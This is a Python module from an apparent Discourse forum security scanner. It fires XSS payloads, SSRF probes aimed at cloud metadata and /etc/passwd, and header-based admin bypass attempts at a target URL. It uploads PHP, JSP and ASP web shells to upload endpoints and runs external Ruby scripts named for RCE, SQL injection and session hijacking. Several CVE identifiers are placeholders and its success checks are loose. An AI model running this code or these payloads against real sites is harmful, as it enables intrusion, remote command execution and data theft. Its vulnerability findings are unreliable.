#!/usr/bin/env python3
"""
Discourse Security Scanner - CVE Exploit Module

Tests for specific CVE vulnerabilities in Discourse forums
Based on known CVEs from 2022-2024
"""

import re
import json
import time
import random
import base64
import os
import subprocess
import tempfile
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from .utils import generate_payloads, extract_csrf_token

class CVEExploitModule:
    """CVE-specific exploit module for Discourse forums"""
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.results = {
            'module_name': 'CVE Exploit Testing',
            'target': scanner.target_url,
            'cve_tests': [],
            'exploitable_cves': [],
            'tests_performed': 0,
            'scan_time': 0
        }
        self.start_time = time.time()
    
    def run(self):
        """Run CVE exploit testing module"""
        self.scanner.log("Starting CVE exploit testing...")
        
        # Test for specific Discourse CVEs
        self._test_cve_2023_37467()  # CSP Nonce Reuse XSS
        self._test_cve_2023_45131()  # Unauthenticated Chat Message Access
        self._test_cve_2022_discourse_xss()  # Multiple XSS vulnerabilities
        self._test_cve_2022_discourse_ssrf()  # SSRF vulnerabilities
        self._test_cve_2023_discourse_info_disclosure()  # Information disclosure
        self._test_cve_2024_discourse_auth_bypass()  # Authentication bypass
        self._test_discourse_file_upload_bypass()  # File upload vulnerabilities
        self._test_discourse_plugin_vulnerabilities()  # Plugin-specific CVEs
        
        # Run Ruby exploit modules
        self._run_ruby_exploits()
        
        self.results['scan_time'] = time.time() - self.start_time
        return self.results
    
    def _test_cve_2023_37467(self):
        """Test for CVE-2023-37467: CSP Nonce Reuse XSS Bypass"""
        self.scanner.log("Testing CVE-2023-37467 (CSP Nonce Reuse XSS)...", 'debug')
        
        cve_info = {
            'cve_id': 'CVE-2023-37467',
            'description': 'CSP nonce reuse vulnerability allowing XSS bypass for anonymous users',
            'severity': 'medium',
            'affected_versions': 'Prior to 3.1.0.beta7',
            'exploit_type': 'XSS'
        }
        
        # Test endpoints that might be vulnerable to CSP bypass
        test_endpoints = [
            '/',
            '/latest',
            '/categories',
            '/search'
        ]
        
        for endpoint in test_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = self.scanner.make_request(url)
            
            if response:
                # Check for Google Tag Manager presence (vulnerability condition)
                if self._check_gtm_presence(response.text):
                    # Check for CSP nonce reuse
                    nonces = self._extract_csp_nonces(response.text)
                    if len(nonces) > 1 and len(set(nonces)) < len(nonces):
                        self._add_cve_result(
                            cve_info,
                            'VULNERABLE',
                            f'CSP nonce reuse detected at {endpoint}',
                            url,
                            {'nonces_found': nonces, 'gtm_present': True}
                        )
                        self.scanner.log(f"CVE-2023-37467 vulnerability found: {url}", 'warning')
                    else:
                        self._add_cve_result(
                            cve_info,
                            'POTENTIAL',
                            f'GTM present but no nonce reuse detected at {endpoint}',
                            url,
                            {'gtm_present': True}
                        )
                else:
                    self._add_cve_result(
                        cve_info,
                        'NOT_VULNERABLE',
                        f'GTM not present at {endpoint}',
                        url
                    )
            
            self.results['tests_performed'] += 1
            time.sleep(0.1)
    
    def _test_cve_2023_45131(self):
        """Test for CVE-2023-45131: Discourse Unauthenticated Chat Message Access"""
        self.scanner.log("Testing CVE-2023-45131 (Unauthenticated Chat Access)...", 'debug')
        
        cve_info = {
            'cve_id': 'CVE-2023-45131',
            'description': 'Information disclosure vulnerability allowing unauthenticated access to new chat messages',
            'severity': 'medium',
            'affected_versions': 'Prior to 3.1.1 stable, 3.2.0.beta2',
            'exploit_type': 'Information Disclosure'
        }
        
        # Test chat plugin endpoints
        chat_endpoints = [
            '/chat',
            '/chat/api/channels',
            '/chat/channels.json',
            '/chat/api/me/channels',
            '/plugins/chat'
        ]
        
        chat_detected = False
        
        for endpoint in chat_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = self.scanner.make_request(url)
            
            if response and response.status_code == 200:
                # Check for chat plugin indicators
                if ('chat' in response.text.lower() and 
                    ('discourse-chat' in response.text or 
                     'chat-channel' in response.text or
                     'chat-message' in response.text)):
                    
                    chat_detected = True
                    self.scanner.log(f"Chat plugin detected at {endpoint}", 'info')
                    
                    # Test for unauthenticated message access
                    try:
                        data = response.json()
                        if isinstance(data, dict) and 'channels' in data:
                            for channel in data['channels']:
                                channel_id = channel.get('id')
                                if channel_id:
                                    self._test_chat_channel_access(channel_id, channel.get('title', 'Unknown'), cve_info)
                    except:
                        # Not JSON, check HTML for channel IDs
                        channel_ids = re.findall(r'data-chat-channel-id=["\']?(\d+)["\']?', response.text)
                        for channel_id in channel_ids:
                            self._test_chat_channel_access(channel_id, f'Channel {channel_id}', cve_info)
            
            self.results['tests_performed'] += 1
            time.sleep(0.1)
        
        if not chat_detected:
            self._add_cve_result(
                cve_info,
                'NOT_APPLICABLE',
                'Chat plugin not detected or not enabled',
                self.scanner.target_url
            )
    
    def _test_chat_channel_access(self, channel_id, channel_name, cve_info):
        """Test access to specific chat channel messages"""
        message_endpoints = [
            f'/chat/api/channels/{channel_id}/messages',
            f'/chat/api/channels/{channel_id}/messages.json',
            f'/chat/channels/{channel_id}/messages',
            f'/chat/{channel_id}/messages'
        ]
        
        for endpoint in message_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = self.scanner.make_request(url)
            
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, dict) and ('messages' in data or 'chat_messages' in data):
                        messages = data.get('messages', data.get('chat_messages', []))
                        if messages:
                            self._add_cve_result(
                                cve_info,
                                'VULNERABLE',
                                f'Unauthenticated access to {len(messages)} messages in channel {channel_name}',
                                url,
                                {'channel_id': channel_id, 'channel_name': channel_name, 'message_count': len(messages)}
                            )
                            self.scanner.log(f"CVE-2023-45131 vulnerability found: {url}", 'warning')
                            return
                except:
                    # Check HTML for message indicators
                    if 'chat-message' in response.text or 'message-content' in response.text:
                        self._add_cve_result(
                            cve_info,
                            'POTENTIAL',
                            f'Potential unauthenticated access to messages in channel {channel_name}',
                            url,
                            {'channel_id': channel_id, 'channel_name': channel_name}
                        )
    

    
    def _check_gtm_presence(self, html_content):
        """Check if Google Tag Manager is present"""
        gtm_indicators = [
            'googletagmanager.com',
            'gtag(',
            'GTM-',
            'google_tag_manager'
        ]
        return any(indicator in html_content for indicator in gtm_indicators)
    
    def _extract_csp_nonces(self, html_content):
        """Extract CSP nonces from HTML content"""
        nonce_pattern = r'nonce=["\']([^"\'\']+)["\']'
        return re.findall(nonce_pattern, html_content)
    
    def _test_cve_2022_discourse_xss(self):
        """Test for CVE-2022 Discourse XSS vulnerabilities"""
        self.scanner.log("Testing CVE-2022 Discourse XSS vulnerabilities...", 'debug')
        
        cve_info = {
            'cve_id': 'CVE-2022-DISCOURSE-XSS',
            'description': 'Multiple XSS vulnerabilities in Discourse 2.8.x',
            'severity': 'medium',
            'affected_versions': 'Prior to 2.8.13',
            'exploit_type': 'XSS'
        }
        
        # Test specific XSS vectors found in 2022
        xss_payloads = [
            '<script>alert("CVE-2022-XSS")</script>',
            '"><script>alert("CVE-2022-XSS")</script>',
            'javascript:alert("CVE-2022-XSS")',
            '<img src=x onerror=alert("CVE-2022-XSS")>',
            '<svg onload=alert("CVE-2022-XSS")></svg>'
        ]
        
        # Test vulnerable endpoints
        vulnerable_endpoints = [
            '/search',
            '/users',
            '/categories',
            '/new-topic',
            '/new-message'
        ]
        
        for endpoint in vulnerable_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for payload in xss_payloads:
                # Test GET parameters
                test_params = {
                    'q': payload,
                    'search': payload,
                    'title': payload,
                    'body': payload,
                    'username': payload
                }
                
                for param, value in test_params.items():
                    test_url = f"{url}?{param}={quote(value)}"
                    response = self.scanner.make_request(test_url)
                    
                    if response and self._detect_xss_reflection(response.text, payload):
                        self._add_cve_result(
                            cve_info,
                            'VULNERABLE',
                            f'XSS vulnerability in {param} parameter at {endpoint}',
                            test_url,
                            {'parameter': param, 'payload': payload}
                        )
                        self.scanner.log(f"CVE-2022 XSS found: {test_url}", 'warning')
                
                self.results['tests_performed'] += 1
                time.sleep(0.1)
    
    def _detect_xss_reflection(self, response_text, payload):
        """Detect if XSS payload is reflected without proper escaping"""
        # Check for unescaped dangerous characters
        dangerous_patterns = [
            r'<script[^>]*>' + re.escape(payload.replace('<script>', '').replace('</script>', '')),
            r'javascript:' + re.escape(payload.replace('javascript:', '')),
            r'onerror\s*=\s*["\']?' + re.escape(payload.split('onerror=')[-1] if 'onerror=' in payload else ''),
            r'onload\s*=\s*["\']?' + re.escape(payload.split('onload=')[-1] if 'onload=' in payload else '')
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Simple check for unescaped payload
        return payload in response_text and '<' in payload and '>' in payload
    
    def _test_cve_2022_discourse_ssrf(self):
        """Test for SSRF vulnerabilities in Discourse"""
        self.scanner.log("Testing SSRF vulnerabilities...", 'debug')
        
        cve_info = {
            'cve_id': 'CVE-2022-DISCOURSE-SSRF',
            'description': 'Server-Side Request Forgery in Discourse',
            'severity': 'high',
            'affected_versions': 'Various versions',
            'exploit_type': 'SSRF'
        }
        
        # SSRF test payloads
        ssrf_payloads = [
            'http://127.0.0.1:80',
            'http://localhost:22',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:25/'
        ]
        
        # Test endpoints that might make external requests
        ssrf_endpoints = [
            '/admin/backups',
            '/admin/customize/themes',
            '/posts/upload',
            '/uploads',
            '/onebox'
        ]
        
        for endpoint in ssrf_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for payload in ssrf_payloads:
                test_params = {
                    'url': payload,
                    'link': payload,
                    'src': payload,
                    'href': payload,
                    'callback': payload
                }
                
                for param, value in test_params.items():
                    test_url = f"{url}?{param}={quote(value)}"
                    response = self.scanner.make_request(test_url)
                    
                    if response and self._detect_ssrf_success(response.text, payload):
                        self._add_cve_result(
                            cve_info,
                            'VULNERABLE',
                            f'SSRF vulnerability in {param} parameter at {endpoint}',
                            test_url,
                            {'parameter': param, 'payload': payload}
                        )
                        self.scanner.log(f"SSRF vulnerability found: {test_url}", 'warning')
                
                self.results['tests_performed'] += 1
                time.sleep(0.2)
    
    def _detect_ssrf_success(self, response_text, payload):
        """Detect SSRF success indicators"""
        # Check for internal service responses
        internal_indicators = [
            'SSH-',  # SSH banner
            'root:x:0:0:',  # /etc/passwd
            'ami-id',  # AWS metadata
            'instance-id',  # AWS metadata
            'Metadata-Flavor: Google',  # GCP metadata
            'Connection refused',
            'Connection timeout',
            'Internal Server Error'
        ]
        
        for indicator in internal_indicators:
            if indicator in response_text:
                return True
        
        # Check for timing-based SSRF (longer response times)
        return False
    
    def _test_cve_2023_discourse_info_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        self.scanner.log("Testing information disclosure vulnerabilities...", 'debug')
        
        cve_info = {
            'cve_id': 'CVE-2023-DISCOURSE-INFO',
            'description': 'Information disclosure in Discourse notifications',
            'severity': 'medium',
            'affected_versions': 'Prior to 2.8.12',
            'exploit_type': 'Information Disclosure'
        }
        
        # Test for notification-based info disclosure
        info_endpoints = [
            '/notifications',
            '/u/notifications',
            '/users/notifications',
            '/admin/users',
            '/admin/logs'
        ]
        
        for endpoint in info_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            response = self.scanner.make_request(url)
            
            if response and response.status_code == 200:
                # Check for sensitive information in notifications
                sensitive_patterns = [
                    r'email["\']?\s*:\s*["\'][^"\'\']+@[^"\'\']+["\']',
                    r'password["\']?\s*:\s*["\'][^"\'\']+["\']',
                    r'api_key["\']?\s*:\s*["\'][^"\'\']+["\']',
                    r'token["\']?\s*:\s*["\'][^"\'\']+["\']',
                    r'secret["\']?\s*:\s*["\'][^"\'\']+["\']'
                ]
                
                for pattern in sensitive_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self._add_cve_result(
                            cve_info,
                            'VULNERABLE',
                            f'Sensitive information disclosed at {endpoint}',
                            url,
                            {'pattern_matched': pattern}
                        )
                        self.scanner.log(f"Information disclosure found: {url}", 'warning')
                        break
            
            self.results['tests_performed'] += 1
            time.sleep(0.1)
    
    def _test_cve_2024_discourse_auth_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        self.scanner.log("Testing authentication bypass vulnerabilities...", 'debug')
        
        cve_info = {
            'cve_id': 'CVE-2024-DISCOURSE-AUTH',
            'description': 'Authentication bypass in Discourse admin panel',
            'severity': 'critical',
            'affected_versions': '2024 versions',
            'exploit_type': 'Authentication Bypass'
        }
        
        # Test admin endpoints with bypass techniques
        admin_endpoints = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/site_settings'
        ]
        
        bypass_techniques = [
            # Header-based bypasses
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Admin': 'true'},
            {'X-Authenticated': 'true'},
            {'Authorization': 'Bearer admin'},
            # Path manipulation
            {},  # Direct access
        ]
        
        for endpoint in admin_endpoints:
            for headers in bypass_techniques:
                url = urljoin(self.scanner.target_url, endpoint)
                response = self.scanner.make_request(url, headers=headers)
                
                if response and self._detect_admin_access(response.text):
                    self._add_cve_result(
                        cve_info,
                        'VULNERABLE',
                        f'Authentication bypass at {endpoint}',
                        url,
                        {'bypass_headers': headers}
                    )
                    self.scanner.log(f"Auth bypass found: {url}", 'error')
                
                self.results['tests_performed'] += 1
                time.sleep(0.1)
    
    def _detect_admin_access(self, response_text):
        """Detect if admin panel is accessible"""
        admin_indicators = [
            'admin dashboard',
            'site settings',
            'user management',
            'admin panel',
            'discourse admin',
            'admin-nav'
        ]
        
        return any(indicator in response_text.lower() for indicator in admin_indicators)
    
    def _test_discourse_file_upload_bypass(self):
        """Test for file upload bypass vulnerabilities"""
        self.scanner.log("Testing file upload bypass vulnerabilities...", 'debug')
        
        cve_info = {
            'cve_id': 'DISCOURSE-FILE-UPLOAD',
            'description': 'File upload restriction bypass',
            'severity': 'high',
            'affected_versions': 'Various',
            'exploit_type': 'File Upload'
        }
        
        upload_endpoints = [
            '/uploads',
            '/admin/backups',
            '/posts/upload',
            '/user_avatar'
        ]
        
        # Malicious file payloads
        malicious_files = {
            'shell.php': b'<?php system($_GET["cmd"]); ?>',
            'shell.jsp': b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'shell.asp': b'<%eval request("cmd")%>',
            'xss.svg': b'<svg onload=alert("XSS")></svg>',
            'shell.php.jpg': b'<?php system($_GET["cmd"]); ?>',  # Double extension
            'shell.phtml': b'<?php system($_GET["cmd"]); ?>',
            'shell.php5': b'<?php system($_GET["cmd"]); ?>'
        }
        
        for endpoint in upload_endpoints:
            url = urljoin(self.scanner.target_url, endpoint)
            
            for filename, content in malicious_files.items():
                files = {'file': (filename, content, 'image/jpeg')}
                
                response = self.scanner.make_request(url, method='POST', files=files)
                
                if response and self._detect_upload_success(response.text, filename):
                    self._add_cve_result(
                        cve_info,
                        'VULNERABLE',
                        f'Malicious file {filename} uploaded to {endpoint}',
                        url,
                        {'filename': filename}
                    )
                    self.scanner.log(f"File upload bypass: {url}", 'warning')
                
                self.results['tests_performed'] += 1
                time.sleep(0.2)
    
    def _detect_upload_success(self, response_text, filename):
        """Detect successful file upload"""
        success_indicators = [
            'upload successful',
            'file uploaded',
            'upload complete',
            filename,
            'success',
            'uploaded'
        ]
        
        return any(indicator in response_text.lower() for indicator in success_indicators)
    
    def _test_discourse_plugin_vulnerabilities(self):
        """Test for plugin-specific vulnerabilities"""
        self.scanner.log("Testing plugin vulnerabilities...", 'debug')
        
        cve_info = {
            'cve_id': 'DISCOURSE-PLUGIN-VULNS',
            'description': 'Various plugin vulnerabilities',
            'severity': 'medium',
            'affected_versions': 'Plugin-dependent',
            'exploit_type': 'Plugin Vulnerabilities'
        }
        
        # Common vulnerable plugins and their endpoints
        plugin_tests = {
            'bbcode': {
                'endpoints': ['/posts', '/new-topic'],
                'payloads': ['[url=javascript:alert(1)]XSS[/url]', '[img]javascript:alert(1)[/img]']
            },
            'calendar': {
                'endpoints': ['/calendar', '/events'],
                'payloads': ['<script>alert(1)</script>', 'javascript:alert(1)']
            },
            'chat': {
                'endpoints': ['/chat', '/messages'],
                'payloads': ['<script>alert(1)</script>', 'unlimited_text_' * 1000]
            }
        }
        
        for plugin, config in plugin_tests.items():
            for endpoint in config['endpoints']:
                url = urljoin(self.scanner.target_url, endpoint)
                
                for payload in config['payloads']:
                    test_data = {
                        'content': payload,
                        'body': payload,
                        'message': payload
                    }
                    
                    response = self.scanner.make_request(url, method='POST', data=test_data)
                    
                    if response and self._detect_plugin_vulnerability(response.text, payload, plugin):
                        self._add_cve_result(
                            cve_info,
                            'VULNERABLE',
                            f'{plugin} plugin vulnerability at {endpoint}',
                            url,
                            {'plugin': plugin, 'payload': payload}
                        )
                        self.scanner.log(f"Plugin vulnerability ({plugin}): {url}", 'warning')
                
                self.results['tests_performed'] += 1
                time.sleep(0.1)
    
    def _detect_plugin_vulnerability(self, response_text, payload, plugin):
        """Detect plugin-specific vulnerabilities"""
        if plugin == 'bbcode':
            return 'javascript:' in response_text and payload in response_text
        elif plugin == 'calendar':
            return '<script>' in response_text or 'javascript:' in response_text
        elif plugin == 'chat':
            return 'error' not in response_text.lower() and len(payload) > 1000
        
        return False
    
    def _add_cve_result(self, cve_info, status, description, url, details=None):
        """Add CVE test result"""
        result = {
            'cve_id': cve_info['cve_id'],
            'cve_description': cve_info['description'],
            'severity': cve_info['severity'],
            'affected_versions': cve_info['affected_versions'],
            'exploit_type': cve_info['exploit_type'],
            'status': status,
            'description': description,
            'url': url,
            'timestamp': time.time()
        }
        
        if details:
            result['details'] = details
        
        self.results['cve_tests'].append(result)
        
        if status == 'VULNERABLE':
            self.results['exploitable_cves'].append(result)
    
    def _run_ruby_exploits(self):
        """Run Ruby exploit modules"""
        self.scanner.log("Running Ruby exploit modules...", 'debug')
        
        # Get the path to ruby_exploits directory
        current_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.dirname(os.path.dirname(current_dir))
        ruby_exploits_dir = os.path.join(project_root, 'ruby_exploits')
        
        if not os.path.exists(ruby_exploits_dir):
            self.scanner.log("Ruby exploits directory not found", 'warning')
            return
        
        # List of Ruby exploit files to run
        ruby_exploits = [
            'CVE-2023-37467.rb',
            'CVE-2023-45131.rb',
            'discourse_api_exploits.rb',
            'discourse_auth_bypass.rb',
            'discourse_csrf.rb',
            'discourse_cve_exploits.rb',
            'discourse_directory_traversal.rb',
            'discourse_file_upload.rb',
            'discourse_file_upload_exploits.rb',
            'discourse_info_disclosure.rb',
            'discourse_lfi.rb',
            'discourse_plugin_exploits.rb',
            'discourse_privilege_escalation.rb',
            'discourse_rce.rb',
            'discourse_session_hijacking.rb',
            'discourse_sql_injection.rb',
            'discourse_ssrf.rb',
            'discourse_xss.rb',
            'discourse_xxe.rb'
        ]
        
        for exploit_file in ruby_exploits:
            exploit_path = os.path.join(ruby_exploits_dir, exploit_file)
            if os.path.exists(exploit_path):
                self._execute_ruby_exploit(exploit_path, exploit_file)
            else:
                self.scanner.log(f"Ruby exploit not found: {exploit_file}", 'debug')
    
    def _execute_ruby_exploit(self, exploit_path, exploit_name):
        """Execute a single Ruby exploit using the Ruby exploit runner"""
        try:
            self.scanner.log(f"Executing Ruby exploit: {exploit_name}", 'debug')
            
            # Create a temporary output file for results
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as temp_file:
                temp_output = temp_file.name
            
            # Get the Ruby exploit runner path
            ruby_exploits_dir = os.path.dirname(exploit_path)
            runner_path = os.path.join(ruby_exploits_dir, 'ruby_exploit_runner.rb')
            
            # Extract exploit name without extension
            exploit_base_name = os.path.splitext(exploit_name)[0]
            
            # Prepare Ruby command using the exploit runner
            cmd = [
                'ruby', 
                runner_path,
                '--target', self.scanner.target_url,
                '--output', temp_output,
                '--timeout', str(self.scanner.timeout),
                '--exploit', exploit_base_name
            ]
            
            # Add proxy if configured
            if hasattr(self.scanner, 'proxy') and self.scanner.proxy:
                cmd.extend(['--proxy', str(self.scanner.proxy)])
            
            # Add verbose flag if scanner is in verbose mode
            if hasattr(self.scanner, 'verbose') and self.scanner.verbose:
                cmd.append('--verbose')
            
            # Execute Ruby exploit with timeout
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=60,  # 60 second timeout for Ruby exploits
                    cwd=ruby_exploits_dir
                )
                
                # Parse results from Ruby exploit
                self._parse_ruby_results(temp_output, exploit_name, result)
                
            except subprocess.TimeoutExpired:
                self.scanner.log(f"Ruby exploit {exploit_name} timed out", 'warning')
                self._add_cve_result(
                    {
                        'cve_id': f'RUBY-{exploit_name}',
                        'description': f'Ruby exploit execution timeout',
                        'severity': 'info',
                        'affected_versions': 'Unknown',
                        'exploit_type': 'Ruby Module'
                    },
                    'TIMEOUT',
                    f'Ruby exploit {exploit_name} execution timed out',
                    self.scanner.target_url
                )
            
            except subprocess.CalledProcessError as e:
                self.scanner.log(f"Ruby exploit {exploit_name} failed: {e}", 'debug')
            
            # Cleanup temporary file
            try:
                os.unlink(temp_output)
            except:
                pass
                
        except Exception as e:
            self.scanner.log(f"Error executing Ruby exploit {exploit_name}: {str(e)}", 'debug')
            self.results['tests_performed'] += 1
    
    def _parse_ruby_results(self, output_file, exploit_name, process_result):
        """Parse results from Ruby exploit execution"""
        try:
            # Try to read JSON output from Ruby exploit
            if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                with open(output_file, 'r') as f:
                    ruby_results = json.load(f)
                
                # Convert Ruby results to Python CVE format
                if isinstance(ruby_results, dict):
                    self._convert_ruby_to_cve_result(ruby_results, exploit_name)
                elif isinstance(ruby_results, list):
                    for result in ruby_results:
                        self._convert_ruby_to_cve_result(result, exploit_name)
            
            # Also parse stdout for any additional information
            if process_result.stdout:
                self._parse_ruby_stdout(process_result.stdout, exploit_name)
            
            # Log any errors from stderr
            if process_result.stderr:
                self.scanner.log(f"Ruby exploit {exploit_name} stderr: {process_result.stderr}", 'debug')
                
        except json.JSONDecodeError:
            # If JSON parsing fails, try to extract information from stdout
            if process_result.stdout:
                self._parse_ruby_stdout(process_result.stdout, exploit_name)
        except Exception as e:
            self.scanner.log(f"Error parsing Ruby results for {exploit_name}: {str(e)}", 'debug')
        
        self.results['tests_performed'] += 1
    
    def _convert_ruby_to_cve_result(self, ruby_result, exploit_name):
        """Convert Ruby exploit result to CVE result format"""
        try:
            cve_info = {
                'cve_id': ruby_result.get('cve', f'RUBY-{exploit_name}'),
                'description': ruby_result.get('description', f'Ruby exploit: {exploit_name}'),
                'severity': ruby_result.get('severity', 'medium').lower(),
                'affected_versions': ruby_result.get('affected_versions', 'Unknown'),
                'exploit_type': 'Ruby Module'
            }
            
            # Determine status based on Ruby results
            status = 'NOT_VULNERABLE'
            if ruby_result.get('vulnerable', False):
                status = 'VULNERABLE'
            elif ruby_result.get('potential', False):
                status = 'POTENTIAL'
            
            # Extract details
            details = ruby_result.get('details', [])
            payloads = ruby_result.get('payloads', [])
            evidence = ruby_result.get('rce_evidence', [])
            
            description = f"Ruby exploit {exploit_name} - {ruby_result.get('description', 'No description')}"
            
            # Add comprehensive details
            result_details = {
                'ruby_exploit': exploit_name,
                'original_results': ruby_result
            }
            
            if details:
                result_details['details'] = details
            if payloads:
                result_details['payloads'] = payloads
            if evidence:
                result_details['evidence'] = evidence
            
            self._add_cve_result(
                cve_info,
                status,
                description,
                self.scanner.target_url,
                result_details
            )
            
            if status == 'VULNERABLE':
                self.scanner.log(f"Ruby exploit {exploit_name} found vulnerability: {cve_info['cve_id']}", 'warning')
            
        except Exception as e:
            self.scanner.log(f"Error converting Ruby result for {exploit_name}: {str(e)}", 'debug')
    
    def _parse_ruby_stdout(self, stdout, exploit_name):
        """Parse Ruby exploit stdout for vulnerability indicators"""
        try:
            # Look for common vulnerability indicators in stdout
            vulnerability_indicators = [
                'VULNERABLE',
                'RCE successful',
                'XSS found',
                'SSRF detected',
                'Auth bypass',
                'File upload bypass',
                'Information disclosure'
            ]
            
            lines = stdout.split('\n')
            for line in lines:
                for indicator in vulnerability_indicators:
                    if indicator.lower() in line.lower():
                        # Extract CVE or vulnerability info from the line
                        cve_match = re.search(r'CVE-\d{4}-\d+', line)
                        cve_id = cve_match.group(0) if cve_match else f'RUBY-{exploit_name}'
                        
                        self._add_cve_result(
                            {
                                'cve_id': cve_id,
                                'description': f'Ruby exploit detection: {line.strip()}',
                                'severity': 'medium',
                                'affected_versions': 'Unknown',
                                'exploit_type': 'Ruby Module'
                            },
                            'VULNERABLE',
                            f'Ruby exploit {exploit_name} detected: {line.strip()}',
                            self.scanner.target_url,
                            {'ruby_output': line.strip()}
                        )
                        
                        self.scanner.log(f"Ruby exploit {exploit_name} detected vulnerability: {line.strip()}", 'warning')
                        break
                        
        except Exception as e:
            self.scanner.log(f"Error parsing Ruby stdout for {exploit_name}: {str(e)}", 'debug')